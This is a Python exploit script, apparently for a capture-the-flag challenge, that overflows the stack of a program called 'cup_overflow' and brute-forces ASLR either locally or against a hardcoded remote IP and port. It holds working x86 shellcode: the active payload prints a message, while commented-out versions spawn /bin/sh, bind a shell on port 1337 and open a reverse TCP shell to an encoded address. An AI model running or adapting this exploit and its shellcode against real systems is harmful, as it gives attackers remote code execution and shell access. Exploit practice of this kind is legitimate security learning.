#!/usr/bin/python

import struct, sys, time
from subprocess import PIPE, Popen
from pprint import pprint
import socket
import time

# execve /bin/sh
# shellcode = ("\x31\xc9\xf7\xe1\x51\x68\x2f\x2f"
#              "\x73\x68\x68\x2f\x62\x69\x6e\x89"
#              "\xe3\xb0\x0b\xcd\x80")

# Bind TCP port 1337
# shellcode = ("\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80")

# Reverse TCP shell
# IPADDR = "\x42\xf9\x45\x11"
# PORT = "\x7a\x69"

# shellcode = ("\x31\xc0\x31\xdb\x31\xc9\x31\xd2"
#         "\xb0\x66\xb3\x01\x51\x6a\x06\x6a"
#         "\x01\x6a\x02\x89\xe1\xcd\x80\x89"
#        "\xc6\xb0\x66\x31\xdb\xb3\x02\x68" +
#        IPADDR + "\x66\x68" + PORT + "\x66\x53\xfe"
#        "\xc3\x89\xe1\x6a\x10\x51\x56\x89"
#        "\xe1\xcd\x80\x31\xc9\xb1\x03\xfe"
#        "\xc9\xb0\x3f\xcd\x80\x75\xf8\x31"
#        "\xc0\x52\x68\x6e\x2f\x73\x68\x68"
#        "\x2f\x2f\x62\x69\x89\xe3\x52\x53"
#        "\x89\xe1\x52\x89\xe2\xb0\x0b\xcd"
#        "\x80")

# Print hello world

shellcode = ("\xeb\x19\x31\xc0\xb0\x04\x31\xdb"
             "\xb3\x01\x59\x31\xd2\xb2\x12\xcd"
             "\x80\x31\xc0\xb0\x01\x31\xdb\xb3"
             "\x01\xcd\x80\xe8\xe2\xff\xff\xff"
             "\x20\x79\x30\x75\x20\x73\x70\x33"
             "\x34\x6b\x20\x31\x33\x33\x37\x20"
             "\x3f\x20")

# makes a directory called "hacked" and then exits
# shellcode = ("\xeb\x16\x5e\x31\xc0\x88\x46\x06\xb0\x27\x8d\x1e\x66\xb9\xed"
#              "\x01\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x68"
#             "\x61\x63\x6b\x65\x64\x23")

bufsize = 150
offset = 12     #incl. saved ebp
nopsize = 4096


OVER_NETWORK = True

TCP_IP = '52.14.30.211'
TCP_PORT = 30548
RECEIVE_BUFFER_SIZE = 1024


def prep_buffer(addr_buffer):
    """
    Create the buffer
    :param addr_buffer:
    :return:
    """
    buf = "A" * (bufsize+offset)
    buf += struct.pack("<I",(addr_buffer+bufsize+offset+4))
    buf += "\x90" * nopsize
    buf += shellcode
    return buf


def brute_aslr(buf):
    """
    Run the overflow
    :param buf:
    :return:
    """
    p = Popen(['./cup_overflow'], stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
    out, err = p.communicate(input=buf)
    # pprint(out)
    pprint(err)
    if err != "Segmentation fault (core dumped)\n":
        return buf
    return None


def brute_aslr_network(buf):
    """
    Run the overflow over the network
    :param buf:
    :return:
    """
    s = socket.create_connection((TCP_IP, TCP_PORT), timeout=2)
    s.sendall(buf)
    data = s.recv(RECEIVE_BUFFER_SIZE)
    print("Received data:")
    pprint(data)
    s.close()
    if data != 'Fill up my cup:\n':
        return buf
    return None


if __name__ == '__main__':
    addr_buffer = 0xffffca0a   # if aslr is on, this is just needs to be in the range of available addresses

    buf = prep_buffer(addr_buffer)
    i = 0
    while True:
        print "Try #" + str(i)
        if OVER_NETWORK:
            shell = brute_aslr_network(buf)
        else:
            shell = brute_aslr(buf)

        if shell:
            print("Found! " + format(addr_buffer, '#04X'))
            # Print out the succesful buffer input
            with open("shell.txt", "w") as f:
                f.write(shell)
            break
        i += 1